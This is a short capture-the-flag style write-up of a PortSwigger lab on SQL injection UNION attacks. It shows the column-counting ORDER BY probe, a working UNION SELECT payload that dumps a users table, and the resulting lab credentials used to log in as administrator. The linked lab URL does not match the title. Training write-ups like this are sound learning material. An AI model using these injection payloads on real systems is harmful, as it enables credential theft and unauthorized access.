# Lab: SQL injection UNION attack, retrieving data from other tables
![](https://img.shields.io/badge/Difficulty-PRACTITIONER-blue)

**Lab Link:** [https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

---

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

---

### My solution:

I started off by determining how many columns were being returned by the original query:
`filter?category=NULL' ORDER BY 1--` and increment it by 1 until I got an error.
I got an error at 3, so the original query returns 2 columns.

Then I crafted this payload and injected it to retrieve the usernames and passwords from the `users` table:
`filter?category=NULL' UNION SELECT username, password FROM users--`
It returned this:
|----------------|-------------------------|
| carlos         | wdx34haxptca1rb7caqs    |
| wiener         | e88jked15ttmw9uum39n    |
| administrator  | pc813hty2fgeufhmqmik    |

So I logged in as administrator using the credentials and finished the lab.
